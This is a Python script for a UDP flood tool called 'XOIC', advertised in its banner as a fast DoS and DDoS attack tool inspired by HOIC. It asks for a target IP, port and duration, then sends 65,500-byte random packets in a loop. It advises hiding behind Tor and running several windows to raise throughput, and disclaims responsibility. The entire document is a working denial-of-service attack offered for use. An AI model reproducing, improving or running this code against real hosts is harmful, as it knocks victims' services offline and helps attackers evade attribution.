import socket
import random
import time
import colorama

from colorama import Fore, Back, Style
print("\n" * 100)
print(Fore.MAGENTA + Style.BRIGHT)
print("""
     8888   8888 8888888 88 8888888
      8888 8888  88   88 88 88
       8888888   88   88 88 88
      8888 8888  88   88 88 88
     8888   8888 8888888 88 8888888
               alpha v0.1
""")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(Fore.BLUE + "We aren't responsible to whatever thing you do using this tool, use it at your own risk.")
print(Fore.MAGENTA + "Use Orbot(Tor) To Hide your ip")
print("")
print(Fore.BLUE + "             XOIC Details: ")
print(Fore.MAGENTA + """
          |-----------------|
          | XOIC v0.1       |
          | Inspired by HOIC|
          | Creator: ultra  |
          | Purpos: Fast Dos|
          | & DDoS Attacks  |
          | Xtream Orbit Ion|
          | Canon           |
          |-----------------|
""")
print(Fore.BLUE + "DoS Speed: " + Fore.MAGENTA + "300+ Mbps")
print(Fore.BLUE + "[!] " + Fore.MAGENTA + "Pro Tip: Open & Use XOIC on multiple Windows to get 1Gbps")
print("")
bytes = random._urandom(65500)


ip = input(Fore.BLUE + 'Target IP: ' + Fore.MAGENTA)
port = int(input(Fore.MAGENTA + 'Port: ' + Fore.BLUE))

duration = input(Fore.BLUE + 'Number of seconds to send packets: ' + Fore.MAGENTA)
print(" ")

timeout = time.time() + float(duration)

sent = 0



while True:

	if time.time() > timeout:

		break

	else:

		pass

	sock.sendto(bytes,(ip, port))

	sent = sent + 1

	print(Fore.MAGENTA + "[+] " + Fore.BLUE + "XOIC " + Fore.MAGENTA + "Sent %s packet to %s through port %s"%(sent, ip, port))
